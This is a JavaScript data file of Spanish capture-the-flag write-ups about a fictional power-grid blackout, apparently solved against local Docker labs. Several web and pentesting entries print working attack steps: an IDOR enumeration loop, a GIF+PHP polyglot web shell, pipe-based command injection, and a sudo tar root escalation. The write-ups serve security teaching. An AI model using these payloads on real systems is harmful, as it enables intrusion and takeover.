// Auto-generated writeup data
const WRITEUPS = [
 {id:"api-de-sectores",title:"API de sectores",category:"Web",points:250,slug:"api-de-sectores",files:["startlab.sh", "blackout-web03.tar"],content:`# API de sectores

> Tablero de telemetría de campo. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> \`chmod +x startlab.sh\`
> \`./startlab.sh blackout-web03.tar\`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap y ataca por HTTP. No expongas el contenedor a internet.
>
> **Consejo:** enumera la IP del lab con nmap. El tablero de campo carga la telemetría de tu zona.

**Flag:** \`WHOAMI{id0r_s3ct0r21}\`

---

## Resolución

El laboratorio es una app web de telemetría energética (LATAM Energía Red). Cada operador tiene asignado un "sector" y el tablero de campo le muestra la telemetría de su zona a través de una API. El fallo está en que esa API no comprueba si el sector que pides es tuyo: al pedir un sector restringido aparece la flag.

### 1. Levantar el laboratorio

\`\`\`bash
$ chmod +x startlab.sh
$ ./startlab.sh blackout-web03.tar
\`\`\`

El contenedor Docker arranca y el script imprime su IP. En mi entorno fue \`172.17.0.2\`.

### 2. Enumerar con nmap

\`\`\`bash
$ nmap -sV 172.17.0.2
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.68 (Debian)
\`\`\`

Un único servicio web en el puerto 80.

### 3. Explorar la app y entrar como operador

Al pedir la raíz, el HTML ya muestra la **barra de navegación** con las cinco páginas:

\`\`\`bash
$ curl -s http://172.17.0.2/ | grep btn-nav
<a class="btn-nav active" href="/index.php">Inicio</a>
<a class="btn-nav" href="/estado.php">Estado red</a>
<a class="btn-nav" href="/tablero.php">Tablero</a>
<a class="btn-nav" href="/comunidad.php">Comunidad</a>
<a class="btn-nav" href="/contacto.php">Contacto</a>
\`\`\`

El tablero de campo pide entrar como operador:

\`\`\`bash
$ curl -X POST -d "entrar=1" -c cookies.txt http://172.17.0.2/tablero.php
\`\`\`

Esto crea una sesión PHP y devuelve el dashboard con tu sector asignado (el 14).

### 4. Descubrir el directorio \`/api\` con gobuster

Las páginas del menú no hablan de ninguna API, así que se fuzzean directorios ocultos:

\`\`\`bash
$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
api (Status: 301)
assets (Status: 301)
includes (Status: 301)
index.php (Status: 200)
\`\`\`

Aparece un directorio \`/api/\` que no está enlazado desde el menú — es la superficie de ataque del reto.

### 5. Descubrir el endpoint de la API

La página del tablero carga un script, \`/assets/tablero.js\`, que hace la petición real de telemetría:

\`\`\`javascript
fetch('/api/sector/' + encodeURIComponent(id) + '/telemetry', { credentials: 'same-origin' })
\`\`\`

El endpoint es \`/api/sector/{id}/telemetry\`. Probándolo con la sesión activa de tu sector:

\`\`\`bash
$ curl -b cookies.txt http://172.17.0.2/api/sector/14/telemetry
{"id":14,"nombre":"Norte","estado":"OFFLINE","carga_mw":"0","nota":"Apagon sector 14. Esperando sync."}
\`\`\`

### 6. Enumerar sectores (IDOR)

El endpoint no verifica que el sector que pides corresponda al operador. Se enumeran los IDs para ver qué sectores existen:

\`\`\`bash
$ for i in {1..50}; do curl -s -b cookies.txt http://172.17.0.2/api/sector/$i/telemetry; echo; done
\`\`\`

| ID | Nombre | Estado |
|----|--------|--------|
| 11 | Occidente | DEGRADADO |
| 12 | Sur | OPERATIVO |
| 13 | Central | OPERATIVO |
| 14 | Norte | OFFLINE |
| 15 | Oriente | ALERTA |
| 16 | Costa | OPERATIVO |
| 21 | Respaldo gerencia | RESTRINGIDO |

### 7. Leer la flag del sector restringido

El sector 21 (\`RESTRINGIDO\`) es la excepción: en vez de telemetría devuelve una cadena en Base64 dentro de \`nota\`:

\`\`\`json
{"id":21,"nombre":"Respaldo gerencia","estado":"RESTRINGIDO","carga_mw":"n\\/d","nota":"V0hPQU1Je2lkMHJfczNjdDByMjF9"}
\`\`\`

Decodificando:

\`\`\`bash
$ echo "V0hPQU1Je2lkMHJfczNjdDByMjF9" | base64 -d
WHOAMI{id0r_s3ct0r21}
\`\`\`

*"idor sector 21"

## Lección

Un endpoint REST que usa un ID de recurso directo (\`/api/sector/{id}\`) debe validar que ese ID pertenece al usuario; solo autenticar la sesión no basta, porque permite leer recursos ajenos enumerando IDs (IDOR).`},
 {id:"archivo-de-turnos",title:"Archivo de turnos",category:"Pentesting",points:300,slug:"archivo-de-turnos",files:["startlab.sh", "blackout-pt02.tar"],content:`# Archivo de turnos

> Nodo de archivo de turnos del sector 14. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> \`chmod +x startlab.sh\`
> \`./startlab.sh blackout-pt02.tar\`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap. No expongas el contenedor a internet.
>
> **Consejo:** empieza por nmap. El portal de archivo no es el único sitio donde el turno deja material.

**Flag:** \`WHOAMI{arch1v0_turn0s}\`

---

## Resolución

El consejo ("el portal no es el único sitio donde el turno deja material") indica que hay datos escondidos fuera del index. La cadena: material expuesto → política de claves → SSH → escalada a root con \`tar\`.

### 1. Levantar el lab y enumerar puertos

**Herramienta:** \`nmap\`. **Por qué:** el consejo pide empezar por un escaneo completo para ver la superficie real.

**Parámetros:** \`-sV\` (versión) y \`-p-\` (todos los puertos).

\`\`\`bash
$ nmap -sV -p- 172.17.0.2
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.2p1 Debian
80/tcp open http Apache httpd 2.4.68 (Debian)
\`\`\`

SSH + HTTP. El portal web no parece tener formularios, así que hay que buscar material oculto.

### 2. Encontrar el material oculto

**Herramienta:** \`curl\` + \`gobuster\`. **Por qué:** el reto avisa que hay material fuera del portal; \`robots.txt\` y el fuzzing de directorios revelan rutas ocultas.

\`\`\`bash
$ curl -s http://172.17.0.2/robots.txt
User-agent: *
Disallow: /export/

$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
export (Status: 301)
\`\`\`

**Lo que vi:** \`robots.txt\` desvela \`/export/\`, un directorio con **listado de índice activado** (Apache \`Indexes\`) que contiene \`historico_turnos.sql\`.

### 3. Analizar el dump SQL

\`\`\`bash
$ curl -s http://172.17.0.2/export/historico_turnos.sql
\`\`\`

El SQL expone una **política de claves** y dos usuarios con su hash:

\`\`\`sql
-- politica de claves del archivo: Marca + Sitio + sector (sin espacios, sector en dos digitos)
INSERT INTO guardia VALUES ('caja.norte','3441077f4445...','caja');
INSERT INTO guardia VALUES ('iris.historico','c7bd71ae7e9c...','archivo');
\`\`\`

**Lo que vi:** la política dice \`Marca + Sitio + sector\`, ej. \`Latam\` + \`Norte\` + \`14\` = \`LatamNorte14\`. Decisión: verificar contra los hashes SHA256.

### 4. Verificar la clave contra los hashes

**Herramienta:** \`python3\` + \`hashlib\`. **Por qué:** comprobar qué combinación de la política genera exactamente el hash del usuario \`archivo\`.

\`\`\`python
import hashlib
h2 = 'c7bd71ae7e9c9b42a68857148964bd09ee35c3ff7576bb638a41a53111a7ecee'
for marca in ['LATAM','Latam','latam',...]:
 for sitio in ['Norte','norte','Patio','Archivo',...]:
 if hashlib.sha256(f'{marca}{sitio}14'.encode()).hexdigest() == h2:
 print('MATCH:', marca+str(sitio)+'14')
# → LatamNorte14
\`\`\`

La clave **\`LatamNorte14\`** coincide con el hash de \`iris.historico\` (rol \`archivo\`).

### 5. Entrar por SSH con la clave derivada

**Herramienta:** \`sshpass\` + \`ssh\`. **Por qué:** el usuario \`archivo\` del dump es el único con shell en el sistema (\`iris.historico\`); la clave derivada de la política debe abrir SSH.

\`\`\`bash
$ sshpass -p "LatamNorte14" ssh iris.historico@172.17.0.2 "id"
uid=1000(iris.historico) gid=1000(iris.historico)
\`\`\`

### 6. Escalar a root con \`sudo tar\`

**Herramienta:** \`sudo -l\` + GTFObins. **Por qué:** ver qué puedo ejecutar como privilegiado para escalar.

\`\`\`bash
$ sudo -l
User iris.historico may run the following commands:
 (root) NOPASSWD: /usr/bin/tar
\`\`\`

**Lo que vi:** puedo ejecutar \`tar\` como root sin contraseña. \`tar\` tiene un checkpoint que ejecuta comandos (\`--checkpoint-action=exec\`), la vía clásica de GTFObins para spawnear un shell:

\`\`\`bash
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 \\
 --checkpoint-action=exec="/bin/sh -c 'id > /tmp/who; cat /var/lib/latam/archivo.dat > /tmp/f'"
$ cat /tmp/who
uid=0(root) gid=0(root)
\`\`\`

### 7. Leer la flag

\`\`\`bash
$ cat /tmp/f
WHOAMI{arch1v0_turn0s}
\`\`\`

*"archivo turnos"

## Lección

El material de un reto puede vivir fuera del index: \`robots.txt\` y el listado de directorios destapan lo que el portal no muestra. Y cuando un dump SQL filtra la **política de generación de claves**, esa política permite derivar la credencial real (aquí, contra el SHA256 del usuario). Luego, un sudo sin contraseña sobre \`tar\` (GTFObins) convierte el acceso en root.`},
 {id:"bitacora-del-blackout",title:"Bitácora del blackout",category:"Misc",points:300,slug:"bitacora-del-blackout",files:["turno.log", "alerta.wav", "spectrogram.png"],content:`# Bitácora del blackout

> Export parcial del turno SCADA + alarma de audio. Reconstruye la secuencia y envía \`WHOAMI{...}\`.
>
> **Consejo:** no todas las líneas \`[SYNC-FRAG]\` son útiles.

**Flag:** \`WHOAMI{b17ac0r4_4ud10_m0r53}\`

---

## Resolución

El paquete trae dos archivos: un log (\`turno.log\`) y una alarma de audio (\`alerta.wav\`). Lo primero es ver qué son antes de tocar nada:

\`\`\`bash
$ file turno.log alerta.wav
turno.log: ASCII text
alerta.wav: RIFF (little-endian) data, WAVE audio, Mono 8000 Hz
\`\`\`

Un log de texto y un WAV mono de 8 kHz. La decisión: como hay un audio de corta duración, casi siempre conviene mirar su espectrograma — ahí suelen esconderse mensajes que no se oyen a simple vista.

### 1. Decodificar los fragmentos base32

**Herramienta:** \`base32 -d\`. **Por qué:** al leer el log, las líneas \`[SYNC-FRAG]\` tienen un \`payload=\` con un patrón de letras mayúsculas y \`=\`, que es la firma del **base32** (codificación en base 32 con relleno \`=\`).

\`\`\`bash
$ echo "K5EE6QKNJF5Q====" | base32 -d # WHOAMI{
$ echo "MIYTOYLDGBZDIXY=" | base32 -d # b17ac0r4_
$ echo "GR2WIMJQL4======" | base32 -d # 4ud10_
$ echo "NUYHENJTPU======" | base32 -d # m0r53}
\`\`\`

| Línea | Hora | payload (base32) | Decodificado |
|---|---|---|---|
| SYNC-FRAG-04 | 03:14:01 | \`K5EE6QKNJF5Q====\` | \`WHOAMI{\` |
| SYNC-FRAG-02 | 03:14:08 | \`MIYTOYLDGBZDIXY=\` | \`b17ac0r4_\` |
| SYNC-FRAG-03 | 03:14:15 | \`GR2WIMJQL4======\` | \`4ud10_\` |
| SYNC-FRAG-01 | 03:14:22 | \`NUYHENJTPU======\` | \`m0r53}\` |

> Ojo: la línea \`[ERROR] FRAG falso positivo payload=JBSWY3DPEEQ====\` decodifica a \`Hello\` — un señuelo. La pista del reto ("no todas las líneas SYNC-FRAG son útiles") avisa que hay fragmentos falsos. Por eso **no** me fié del número de fragmento.

### 2. Descifrar el orden: el audio es Morse

**Herramienta:** \`sox\` / espectrograma + lectura de intervalos. **Por qué:** como los fragmentos decodifican bien pero hay un orden correcto, el audio debe dar la instrucción de cómo ordenarlos.

\`alerta.wav\` es un tono de 879 Hz con ráfagas on/off. Al medir los intervalos de tono y silencio se ve el patrón:

- Tono corto (~3.4 s) = **punto**
- Tono largo (~10 s) = **raya**
- Silencio corto = separador entre símbolos
- Silencio largo (~13 s) = separador entre letras

\`\`\`
— .. —— . → T I M E
\`\`\`

El Morse dice **TIME**: la clave es el **orden temporal** (los timestamps), no el número de fragmento.

### 3. Reconstruir la flag

Ordenando por hora: \`WHOAMI{\` + \`b17ac0r4_\` + \`4ud10_\` + \`m0r53}\`

\`\`\`
WHOAMI{b17ac0r4_4ud10_m0r53}
\`\`\`

*"bitacora audio morse"

## Lección

Cuando un reto mezcle log + audio, mira qué hay *dentro* del audio (espectrograma/Morse) antes de adivinar el orden: suele contener la instrucción de cómo combinar los fragmentos del log.`},
 {id:"boveda-keepass",title:"Bóveda KeePass",category:"Cripto",points:500,slug:"boveda-keepass",files:["ingeniero.kdbx", "politica_acceso.txt"],content:`# Bóveda KeePass

> Bóveda KeePass (ingeniero.kdbx) con las claves de recuperación del sector 14. Abre la entrada y envía \`WHOAMI{...}\`.
>
> **Consejo:** KeePassXC + politica_acceso.txt, o keepass2john / hashcat -m 13400.

**Flag:** \`WHOAMI{k33p4ss_b0v3d4_14}\`

---

## Resolución

El pack contiene una bóveda KeePass (\`ingeniero.kdbx\`) y un archivo \`politica_acceso.txt\` que da la clave para derivar la contraseña maestra de la bóveda. Si se abre la bóveda, la entrada "Recuperación sector 14" guarda la flag.

### 1. Descomprimir y ver los archivos

\`\`\`bash
$ unzip boveda_keepass.zip
\`\`\`

- \`ingeniero.kdbx\` — base de datos KeePass (Keepass password database 2.x KDBX)
- \`politica_acceso.txt\` — la política de contraseñas

### 2. Leer la política de acceso

\`\`\`bash
$ cat politica_acceso.txt
Política de acceso — Red LATAM Energía (2026)
Las bóvedas personales deben usar: RolDominio.Año
Ejemplo de forma: Ingeniero.Norte2026
No reutilizar PIN de panel local.
\`\`\`

**Lo que vi:** la política da el formato exacto de la contraseña maestra: \`RolDominio.Año\`. La bóveda es del *Ingeniero*, y el ejemplo es \`Ingeniero.Norte2026\` → contraseña candidata: **\`Ingeniero.Norte2026\`**.

### 3. Abrir la bóveda con KeePassXC

**Herramienta:** \`keepassxc-cli\`. **Por qué:** KeePassXC es un gestor de contraseñas compatible con KDBX; su CLI permite listar y mostrar entradas sin interfaz gráfica.

Primero listamos para confirmar que la contraseña abre la bóveda y ver su estructura:

\`\`\`bash
$ echo "Ingeniero.Norte2026" | keepassxc-cli ls -R -f ingeniero.kdbx
Blackout LATAM/
Blackout LATAM/Recuperación sector 14
\`\`\`

**Lo que vi:** la bóveda se abrió y contiene una única entrada, "Recuperación sector 14".

### 4. Mostrar la entrada protegida

La flag suele vivir en campos marcados como *protegidos*, así que se muestra todo en claro.

**Parámetros:** \`-q\` (silencia el prompt), \`-s --show-protected\` (muestra los atributos protegidos en claro), \`--all\` (todos los campos).

\`\`\`bash
$ echo "Ingeniero.Norte2026" | keepassxc-cli show -q -s --all "ingeniero.kdbx" "Blackout LATAM/Recuperación sector 14"
Title: Recuperación sector 14
UserName: ingeniero.campo@redlatam.energia
Password: WHOAMI{k33p4ss_b0v3d4_14}
URL:
Notes: Solo usar si el SCADA central no responde.
\`\`\`

La flag estaba en el campo \`Password\` de la entrada. *"keepass boveda 14"

## Lección

Una bóveda KeePass vale lo que vale su contraseña maestra: si el formato de esa contraseña sigue una política corporativa predecible (\`RolDominio.Año\`) y el archivo de política se filtra junto a la bóveda, la "protección" desaparece. Además, la flag en campos protegidos se lee con \`--show-protected\`.`},
 {id:"carga-de-evidencias",title:"Carga de evidencias",category:"Web",points:425,slug:"carga-de-evidencias",files:["startlab.sh", "blackout-web05.tar"],content:`# Carga de evidencias

> Bandeja de evidencias de campo. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> \`chmod +x startlab.sh\`
> \`./startlab.sh blackout-web05.tar\`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap y ataca por HTTP. No expongas el contenedor a internet.
>
> **Consejo:** enumera la IP del lab con nmap. Hay una bandeja para archivar evidencias de campo.

**Flag:** \`WHOAMI{up10ad_3v1d3nc14}\`

---

## Resolución

El lab es una app web con una **bandeja de evidencias** (\`/carga.php\`) que permite subir el "registro fotográfico" del turno. El reto gira en torno a esa subida de archivos: si el filtro no está bien hecho, se puede convertir en ejecución remota de comandos (RCE).

### 1. Levantar el lab y enumerar

**Herramienta:** \`docker inspect\` + \`nmap\`. **Por qué:** obtengo la IP del contenedor y los servicios a los que atacar.

**Parámetros de nmap:** \`-sV\` (versión del servicio) y \`-p-\` (todos los puertos).

\`\`\`bash
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web05
172.17.0.2

$ nmap -sV 172.17.0.2
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.68 (Debian)
\`\`\`

Solo el puerto 80 → el ataque es por HTTP.

### 2. Explorar la app y localizar la subida

En el menú aparece \`/carga.php\`, un formulario de subida de archivos con \`accept="image/*"\`:

\`\`\`bash
$ curl -s http://172.17.0.2/carga.php
<form method="post" action="/carga.php" enctype="multipart/form-data">
 <input type="file" name="evidencia" accept="image/*">
 <button type="submit">Subir evidencia</button>
</form>
\`\`\`

### 3. Inspeccionar la validación del servidor

**Herramienta:** \`docker exec\` (acceso al contenedor). **Por qué:** ver el código de \`carga.php\` para entender qué valida antes de intentar un bypass.

\`\`\`bash
$ sudo docker exec blackout-web05 cat /var/www/html/carga.php
\`\`\`

La lógica de validación:

- Bloquea nombres con \`.htaccess\` o extensiones \`php|php3|php4|php5|phar\`.
- Exige \`Content-Type: image/...\` (prefijo \`image/\`).
- Exige que el archivo pase \`getimagesize()\` (debe ser una imagen válida).

\`\`\`php
$bloqueada = preg_match('/htaccess/i', $orig) || preg_match('/\\.(php|php3|php4|php5|phar)(\\.|$)/i', $orig);
if ($orig === '' || $bloqueada || strncmp($ctype, 'image/', 6) !== 0 || @getimagesize($tmp) === false) { ... }
\`\`\`

### 4. Encontrar la vía de bypass

**Herramienta:** revisar la configuración de Apache. **Por qué:** el blocklist solo cubre \`.php\` y variantes, pero Apache puede ejecutar otras extensiones como PHP según su \`SetHandler\`.

\`\`\`bash
$ sudo docker exec blackout-web05 cat /etc/apache2/conf-available/zzz-portal.conf
<FilesMatch "\\.(phtml|php7|pht)$">
 SetHandler application/x-httpd-php
</FilesMatch>
\`\`\`

**Lo que vi:** Apache ejecuta como PHP las extensiones \`.phtml\`, \`.php7\` y \`.pht\` — **ninguna está en el blocklist** del servidor. La vía es subir un \`.phtml\` que sea a la vez una imagen válida (para pasar \`getimagesize\`) y contenga código PHP.

### 5. Crear y subir el poliglota GIF+PHP

**Herramienta:** \`python3\` + \`curl\`. **Por qué:** construyo un GIF 1×1 válido (bytes de cabecera que \`getimagesize\` reconoce) y le añado un payload PHP al final; al servirse como \`.phtml\`, PHP lo ejecuta.

\`\`\`bash
$ python3 -c "
gif = open('/tmp/base.gif','rb').read()
open('/tmp/evidencia.phtml','wb').write(gif + b'<?php system(\\$_GET[\\"c\\"]); ?>')
"
$ file /tmp/evidencia.phtml
GIF image data, version 89a, 1 x 1 # pasa getimagesize
\`\`\`

Subir indicando \`type=image/gif\`:

\`\`\`bash
$ curl -F "evidencia=@evidencia.phtml;type=image/gif" http://172.17.0.2/carga.php
<div class="alert">Registro archivado. <a href="/evidencias/evidencia.phtml">Abrir evidencia</a></div>
\`\`\`

### 6. Ejecutar comandos (RCE)

Accediendo al archivo subido con el parámetro \`c\`:

\`\`\`bash
$ curl "http://172.17.0.2/evidencias/evidencia.phtml?c=id"
uid=33(www-data) gid=33(www-data)
\`\`\`

**RCE confirmado.** A partir de aquí busco la flag.

### 7. Localizar y leer la flag

**Herramienta:** \`find\` / \`ls\` en ubicaciones típicas de la app. **Por qué:** en retos anteriores de este lab la flag vive en archivos \`.dat\` bajo \`/var/lib/latam\`.

\`\`\`bash
$ curl "http://172.17.0.2/evidencias/evidencia.phtml?c=ls /var/lib/latam"
evidencia.dat nodo.cache turno.log
\`\`\`

\`evidencia.dat\` contiene el registro con la flag en **base64**:

\`\`\`bash
$ curl "http://172.17.0.2/evidencias/evidencia.phtml?c=cat /var/lib/latam/evidencia.dat"
REGISTRO=V0hPQU1Je3VwMTBhZF8zdjFkM25jMTR9

$ echo "V0hPQU1Je3VwMTBhZF8zdjFkM25jMTR9" | base64 -d
WHOAMI{up10ad_3v1d3nc14}
\`\`\`

*"upload evidencia"

## Lección

Una subida de archivos que valida \`getimagesize()\` pero no limita qué extensiones ejecuta Apache es vulnerable: \`.phtml\`/\`.php7\`/\`.pht\` no suelen estar en el blocklist y se interpretan como PHP. Un poliglota (GIF válido + payload PHP) combina ambas cosas y da RCE.`},
 {id:"cartel-en-la-subestacion",title:"Cartel en la subestación",category:"Misc",points:100,slug:"cartel-en-la-subestacion",files:["subestacion.jpg"],content:`# Cartel en la subestación

> Durante el apagón LATAM, un operador documentó la subestación Norte. Analiza la foto y encuentra \`WHOAMI{...}\`.
>
> **Consejo:** las cámaras y los SCADA suelen guardar más datos de los que se ven en la imagen.

**Flag:** \`WHOAMI{3x1f_r3v34l4d_sub3st4c10n}\`

---

## Resolución

La pista ("guardan más datos de los que se ven en la imagen") apunta a los **metadatos EXIF**: información extra que se guarda dentro del archivo, junto a los píxeles. Lo primero es identificar el tipo de archivo y, según el consejo del reto, revisar sus metadatos — no empezar por estego visual. Empezamos identificando el archivo y leyendo todos sus metadatos:

\`\`\`bash
$ file subestacion.jpg
JPEG image data, JFIF standard 1.01, ... Exif Standard: [TIFF image data,
big-endian, ... description=Inspeccion post-blackout — Subestacion Norte,
software=Panel SCADA export v2.1], baseline, precision 8, 1200x675

$ exiftool -a -u -g1 subestacion.jpg
...
---- ExifIFD ----
User Comment : WHOAMI{3x1f_r3v34l4d_sub3st4c10n}
\`\`\`

La flag estaba directamente en el campo \`User Comment\`. Los demás campos (\`Software: Panel SCADA export v2.1\`, \`Artist: Operador turno noche (Red LATAM)\`, \`Copyright: Uso interno...\`) son ambientación del reto.

> **Sobre los parámetros:** \`-a\` muestra todos los campos (incluso duplicados, que por defecto se ocultan y a veces esconden la flag), \`-u\` muestra valores en bruto sin transformar, y \`-g1\` agrupa la salida por sección para leerla ordenada.

## Lección

Antes de buscar estego o hacer análisis pesado, revisa siempre los metadatos: \`exiftool -a -u -g1 archivo\`. Muchos retos de forensics/misc esconden la flag en campos como \`User Comment\`, \`Artist\`, \`Software\` o \`Copyright\`.`},
 {id:"coordenadas-del-apagon",title:"Coordenadas del apagón",category:"Misc",points:500,slug:"coordenadas-del-apagon",files:["qr_a.png", "qr_b.png", "qr_c.png", "comunicado.html", "cargas.csv"],content:`# Coordenadas del apagón

> Paquete incompleto del mapa de verificación (sector 14). Recompone el mapa y envía \`WHOAMI{...}\`.
>
> **Consejo:** tres imágenes son una sola pieza partida.

**Flag:** \`WHOAMI{m4p4_bl4ck0ut_c00rd3n4d4s}\`

---

## Resolución

El paquete trae tres piezas de QR (\`qr_a\`, \`qr_b\`, \`qr_c\`), un \`comunicado.html\` y \`cargas.csv\`. Antes de nada conviene identificar cada archivo y leer el comunicado, porque el reto ya avisa ("tres imágenes son una sola pieza partida") y el comunicado suele contener el orden de ensamblaje.

\`\`\`bash
$ file qr_a.png qr_b.png qr_c.png
qr_a.png: PNG image data, 296 x 98, ...
qr_b.png: PNG image data, 296 x 98, ...
qr_c.png: PNG image data, 296 x 100, ...
\`\`\`

Tres tiras horizontales del mismo ancho → son cortes verticales de un mismo QR. El comunicado confirma que se recomponen **de arriba hacia abajo** y que el código devuelve coordenadas para cruzar con la columna \`sigilo\` del CSV.

### 1. Reconstruir el mapa (unir los tres QR)

**Herramienta:** ImageMagick (\`convert\`). **Por qué:** \`convert\` permite combinar imágenes; aquí sirve para apilar las tres tiras y recomponer el QR completo.

**Parámetro:** \`-append\` apila las imágenes **verticalmente** (una debajo de otra), que es justo el orden que pide el comunicado.

\`\`\`bash
$ convert qr_a.png qr_b.png qr_c.png -append qr_full.png
\`\`\`

Las alturas 98+98+100 = 296 dan un QR cuadrado de 296×296, como debe ser.

### 2. Leer el código

**Herramienta:** \`zbarimg\`. **Por qué:** es un lector de códigos de barras/QR por línea de comandos.

**Parámetros:** \`--quiet\` suprime el ruido, \`--raw\` devuelve el contenido crudo sin etiquetas.

\`\`\`bash
$ zbarimg --quiet --raw qr_full.png
REDLATAM-2026|coords=1,1;1,4;2,2;3,3;4,1;4,4|read=sigilo
\`\`\`

El QR revela las coordenadas de las celdas a consultar: \`(1,1)\`, \`(1,4)\`, \`(2,2)\`, \`(3,3)\`, \`(4,1)\`, \`(4,4)\` y confirma que hay que leer la columna \`sigilo\`.

### 3. Cruzar con \`cargas.csv\`

**Herramienta:** \`base32 -d\`. **Por qué:** los valores de la columna \`sigilo\` tienen el patrón de mayúsculas y \`=\` típico del base32.

| Coordenada | Valor \`sigilo\` | Decodificado (base32) |
|---|---|---|
| 1,1 | \`K5EE6QKNJF5Q====\` | \`WHOAMI{\` |
| 1,4 | \`NU2HANC7\` | \`m4p4_\` |
| 2,2 | \`MJWDIY3LGA======\` | \`bl4ck0\` |
| 3,3 | \`OV2F6YZQ\` | \`ut_c0\` |
| 4,1 | \`GBZGIM3O\` | \`0rd3n\` |
| 4,4 | \`GRSDI435\` | \`4d4s}\` |

\`\`\`bash
$ echo "K5EE6QKNJF5Q====" | base32 -d
WHOAMI{
\`\`\`

### 4. Concatenar

Siguiendo el orden exacto que devuelve el QR:

\`\`\`
WHOAMI{ + m4p4_ + bl4ck0 + ut_c0 + 0rd3n + 4d4s}
\`\`\`

**\`WHOAMI{m4p4_bl4ck0ut_c00rd3n4d4s}\`**

>

## Lección

Cuando un reto entregue varias tiras de imagen, únelas primero (\`convert -append\`) y decodifica con \`zbarimg\` antes de analizar nada más — el código puede contener el orden de lectura de los datos.`},
 {id:"diagnostico-de-enlace",title:"Diagnóstico de enlace",category:"Web",points:350,slug:"diagnostico-de-enlace",files:["startlab.sh", "blackout-web04.tar"],content:`# Diagnóstico de enlace

> Visor de diagnóstico de enlace de la subestación Norte. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
>
> \`chmod +x startlab.sh && ./startlab.sh blackout-web04.tar\` → IP del lab (172.18.0.2). Enumera con nmap y ataca por HTTP.
>
> **Consejo:** enumera la IP del lab con nmap. Hay un visor de diagnóstico de nodo.

**Flag:** \`WHOAMI{cmd1_enlac3_n0rt3}\`

---

## Resolución

### 1. Levantar y enumerar

**Herramienta:** \`docker inspect\` + \`nmap\`. **Por qué:** el script de arranque no me deja la IP fija, así que la consulto a Docker; luego \`nmap\` me dice qué servicios hay a los que atacar por HTTP.

**Parámetros de nmap:** \`-sV\` (detección de versión del servicio) y \`-p-\` (escanea los 65535 puertos, no solo los comunes).

\`\`\`bash
$ unzip blackout-web04.zip && chmod +x startlab.sh && ./startlab.sh blackout-web04.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web04
172.17.0.2

$ nmap -sV -p- 172.17.0.2
80/tcp open http Apache httpd 2.4.68 (Debian)
\`\`\`

Solo el puerto 80. Como solo hay HTTP, el ataque será por esa vía.

### 2. Encontrar el visor de diagnóstico

Al fuzzear/explorar la app aparece \`/diagnostico.php\`, que ofrece un "chequeo de nodo": un campo \`host\` que se envía por POST. Revisando el código del endpoint:

\`\`\`php
$host = (string) ($_POST['host'] ?? '');
if ($host === '' || preg_match('/[;&\`\\n\\r]/', $host)) {
 $error = '...';
} else {
 $salida = shell_exec('getent ahosts ' . $host . ' 2>&1');
}
\`\`\`

Ejecuta \`getent ahosts <host>\` en el shell. El filtro bloquea \`;\`, \`&\`, backticks y saltos de línea… **pero no bloquea \`|\`** → **command injection por pipe**.

### 3. Inyectar con \`|\`

**Herramienta:** \`curl\`. **Por qué:** sirve para enviar peticiones HTTP arbitrarias; aquí, el POST con el payload malicioso en el campo \`host\`.

**Parámetros:** \`-X POST\` fija el método y \`-d\` envía el cuerpo del formulario.

\`\`\`bash
$ curl -X POST http://172.17.0.2/diagnostico.php -d "host=127.0.0.1|id"
uid=33(www-data) gid=33(www-data)
\`\`\`

El pipe ejecuta un comando adicional. **Lo que vi:** el \`|\` ejecutó \`id\` y devolvió el usuario \`www-data\`, confirmando la inyección. A partir de ahí se explora el sistema buscando la flag:

\`\`\`bash
$ curl -X POST http://172.17.0.2/diagnostico.php \\
 --data-urlencode "host=127.0.0.1|find / -name '*.dat' 2>/dev/null | grep -v proc"
/var/lib/latam/enlace.dat
\`\`\`

**Decisión:** como el reto es de "enlace"/telemetría, busqué archivos \`.dat\` (típicos de datos) y apareció \`enlace.dat\`.

### 4. Leer el archivo con la flag

\`\`\`bash
$ curl -X POST http://172.17.0.2/diagnostico.php \\
 --data-urlencode "host=127.0.0.1|cat /var/lib/latam/enlace.dat"
REGISTRO=V0hPQU1Je2NtZDFfZW5sYWMzX24wcnQzfQ==
\`\`\`

El valor termina en \`==\`, firma de **base64**:

\`\`\`bash
$ echo "V0hPQU1Je2NtZDFfZW5sYWMzX24wcnQzfQ==" | base64 -d
WHOAMI{cmd1_enlac3_n0rt3}
\`\`\`

*"cmd inyección enlace norte"

## Lección

Un campo que se mete en un \`shell_exec\` es oro. Si el filtro bloquea \`;\` y \`&\`, prueba \`|\` (pipe): ejecuta un comando adicional sin necesitar terminador. Luego, explora \`/var/lib\` o directorios de la app: ahí suelen esconder archivos \`.dat\` con la flag en base64.`},
 {id:"evidencia-en-http",title:"Evidencia en HTTP",category:"Forense",points:500,slug:"evidencia-en-http",files:["sala_control.pcap"],content:`# Evidencia en HTTP

> Descarga PNG desde el portal forense capturada en sala de control. Extrae el archivo del PCAP y envía \`WHOAMI{...}\`.
>
> **Consejo:** hay una transferencia HTTP con \`Content-Type: image/png\`.

**Flag:** \`WHOAMI{pcp4_c4rv3_4nd_m3rg3}\`

---

## Resolución

### 1. Ver el tráfico

**Herramienta:** \`tshark\`. **Por qué:** es el analizador de PCAP por línea de comandos de Wireshark; sirve para listar los paquetes de una captura.

\`\`\`bash
$ tshark -r sala_control.pcap
 4 10.14.0.40 → 10.14.0.8 HTTP GET /export/evidencia_sala.png HTTP/1.1
 5 10.14.0.8 → 10.14.0.40 HTTP HTTP/1.1 200 OK (PNG)
\`\`\`

